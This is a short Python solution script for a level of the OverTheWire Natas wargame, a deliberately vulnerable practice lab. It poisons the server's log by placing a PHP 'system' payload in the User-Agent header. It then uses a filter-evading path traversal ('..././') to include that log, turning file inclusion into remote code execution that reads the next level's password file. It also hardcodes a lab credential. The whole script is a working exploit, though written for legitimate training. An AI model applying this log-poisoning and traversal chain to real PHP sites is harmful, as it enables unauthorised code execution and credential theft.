#!/usr/bin/env python

import requests
import re

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}

response = session.get(url, auth=(username, password))
response = session.post(url, headers = headers, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}, auth=(username, password))

# print(session.cookies['PHPSESSID']) #1ag39v0nmjqgk9tth39mh49ga2
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)
 
# LFI to RCE with User-Agent